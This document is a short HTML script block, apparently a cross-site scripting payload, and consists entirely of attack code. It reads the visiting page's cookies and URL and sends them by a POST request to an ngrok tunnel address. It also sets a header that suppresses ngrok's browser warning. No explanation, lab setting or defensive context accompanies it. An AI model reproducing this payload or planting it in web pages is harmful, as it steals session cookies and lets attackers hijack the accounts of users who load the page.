<script>
  fetch('https://osprey-gorgeous-gazelle.ngrok-free.app/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'ngrok-skip-browser-warning': 'true'
    },
    body: JSON.stringify({
      cookies: document.cookie,
      location: window.location.href
    })
  }).then(response => response.text())
    .then(data => console.log('Data sent successfully:', data))
    .catch(error => console.error('Error:', error));
</script>
